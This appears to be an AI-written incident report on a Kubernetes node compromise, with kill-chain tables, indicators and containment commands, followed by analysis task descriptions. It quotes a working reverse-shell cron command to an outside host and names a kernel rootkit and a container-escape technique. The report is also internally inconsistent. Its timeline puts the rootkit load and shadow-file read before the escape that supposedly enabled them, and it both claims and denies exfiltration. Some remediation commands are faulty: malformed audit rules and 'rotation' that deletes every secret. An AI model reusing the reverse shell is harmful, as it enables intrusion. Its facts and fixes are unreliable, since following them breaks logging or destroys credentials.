attached_files.extracted_text:
Executive Summary

A single Kubernetes worker node (k8s-worker-node-01) was compromised through a container breakout that enabled host‑level access, kernel rootkit installation, cluster‑admin privilege escalation, credential dumping, and persistence via a reverse‑shell cron job. The attacker leveraged the compromised service account webapp-sa to gain unrestricted control of the Kubernetes control plane and to exfiltrate secrets. Immediate isolation, kernel integrity verification, RBAC rollback, secret rotation, and crontab cleanup are required to contain the threat and prevent lateral movement.

1. Incident Overview
PHASE	KEY EVENT	LOG SOURCE	TIMESTAMP (UTC)
Reconnaissance	Cross‑namespace pod discovery by webapp-sa	k8s_api_audit.json	08:48:12
Container Escape	Privileged pod system-health-diagnostics-pod created with host access; nsenter escape	k8s_api_audit.json, linux_dmesg_syslog.log	08:50:04
Control‑Plane Takeover	ClusterRoleBinding granting cluster-admin to webapp-sa	k8s_api_audit.json	08:52:18
Credential Dumping	/etc/shadow read by root shell; cluster secrets dumped	linux_audit.log, k8s_api_audit.json	08:42:15 / 08:53:40
Kernel Compromise	LKM diamorphine.ko loaded via insmod	linux_dmesg_syslog.log, linux_audit.log	08:45:30
Persistence	Reverse‑shell cron job under www-data	linux_auth.log	08:39:01
Local Pivot	Interactive root shell via deploy	linux_auth.log	08:42:05
2. Impact Assessment
CATEGORY	FINDINGS
Cluster Control	Attacker holds cluster-admin; can modify any resource, including secrets and RBAC objects.
Host Kernel	Rootkit installed (diamorphine.ko) provides stealth persistence and potential lateral movement to other nodes.
Credential Exposure	Password hashes from /etc/shadow and all cluster secrets were extracted.
Persistence & C2	Reverse‑shell cron job ensures continued foothold even after reboots.
Lateral Movement	No evidence of further spread beyond the compromised node; no external exfiltration detected in logs.
3. Timeline (Compressed)
UTC TIME	EVENT	INDICATOR
08:39:01	Cron job under www-data spawns reverse shell to 198.51.100.77:4444	C2 outbound connection
08:42:05	deploy obtains root shell via sudo	Local pivot
08:42:15	/etc/shadow read (auditd syscall 257)	Credential dumping
08:45:30	diamorphine.ko loaded (auditd syscall 313)	Kernel compromise
08:48:12	Cross‑namespace discovery by webapp-sa	Reconnaissance
08:50:04	Privileged pod created; nsenter escape	Container breakout
08:52:18	ClusterRoleBinding to cluster-admin	Control‑plane takeover
08:53:40	Secret dump across namespace default	Credential dumping
4. Confirmed Threat Indicators (IoCs)
INDICATOR TYPE	VALUE	SOURCE
ServiceAccount	system:serviceaccount:frontend-apps:webapp-sa	k8s_api_audit.json
Host IP	10.244.1.45	k8s_api_audit.json
External C2 IP	198.51.100.77	linux_auth.log
Kernel Module	diamorphine.ko	linux_dmesg_syslog.log, linux_audit.log
Cron Job	/bin/bash -c "bash -i >& /dev/tcp/198.51.100.77/4444 0>&1"	linux_auth.log
Privileged Pod	system-health-diagnostics-pod (hostPID=True, hostNetwork=True, hostIPC=True, hostPath='/')	k8s_api_audit.json
ClusterRoleBinding	system-cluster-admin-binding	k8s_api_audit.json
5. Immediate Containment Actions
Quarantine Node
# On the compromised node
iptables -A INPUT -j DROP
iptables -A OUTPUT -j DROP

Kernel Integrity Verification & Module Removal
lsmod | grep diamorphine
rmmod diamorphine

Revoke Elevated Privileges
kubectl delete clusterrolebinding system-cluster-admin-binding

Secret Rotation
# Rotate all secrets in the default namespace
kubectl get secret -n default -o name | xargs -I{} kubectl delete secret {}

Cron & Persistence Cleanup
crontab -u www-data -l | grep -v '198.51.100.77' | crontab -
crontab -u deploy -l | grep -v '198.51.100.77' | crontab -

Auditd Logging Enhancement
echo "auditctl -a always,exit -F arch=b64 -S insmod,finit_module -k kernel_module_load" >> /etc/audit/rules.d/99-kernel.rules
echo "auditctl -a always,exit -F arch=b64 -S openat -F path=/etc/shadow -k shadow_access" >> /etc/audit/rules.d/99-shadow.rules
service auditd restart

6. Long‑Term Remediation & Monitoring
AREA	ACTION
Kernel Hardening	Enable module signing; restrict insmod to signed modules only.
Pod Security	Enforce PodSecurityPolicy or OPA Gatekeeper rules that deny host access unless explicitly approved.
Audit Logging	Centralize auditd logs to a secure, tamper‑evident SIEM; enable real‑time alerts for syscall=313 and openat /etc/shadow.
C2 Detection	Deploy Falco or Sysdig to flag outbound connections from cron jobs to unknown IPs.
RBAC Review	Periodically audit ServiceAccounts for cluster‑admin privileges; enforce least privilege.
Incident Response Playbook	Update playbooks to include kernel module removal, node quarantine, and secret rotation as first‑line actions.
7. Conclusion

The evidence conclusively demonstrates a multi‑stage compromise confined to k8s-worker-node-01. The attacker achieved full cluster control, installed a stealth kernel rootkit, harvested credentials, and established persistent reverse‑shell access. Immediate isolation, kernel module removal, RBAC rollback, secret rotation, and cron cleanup are mandatory to contain the threat. Enhanced monitoring and hardening will prevent recurrence and enable rapid detection of similar future attacks.

units.task_name: Parse and Extract Relevant Security Events
units.description: Using the ingested data, parse each log format (syslog, auditd, auth.log, Kubernetes JSON audit). Identify events related to crontab execution, reverse shell initiation, sudo usage, kernel module loading, nsenter calls, and secret dumping. Produce a structured table of extracted events with fields: timestamp, source_file, event_type, user, command/operation, target_object.

Merge the event table from t2 with the Kubernetes audit data to align timestamps across hosts, containers, and API calls. Detect causal links (e.g., a crontab entry leading to a reverse shell, which triggers sudo escalation, etc.). Generate a chronological timeline highlighting key transition points.

units.task_name: Reconstruct Full Attack Kill Chain and Produce Summary Report
units.description: Using the correlated timeline, map each step to the MITRE ATT&CK techniques (e.g., T1053 for scheduled tasks, T1068 for privilege escalation, T1014 for kernel rootkits, T1071 for command & control, T1105 for remote file copy, etc.). Summarize the kill chain in a concise narrative and provide actionable recommendations to mitigate each technique.
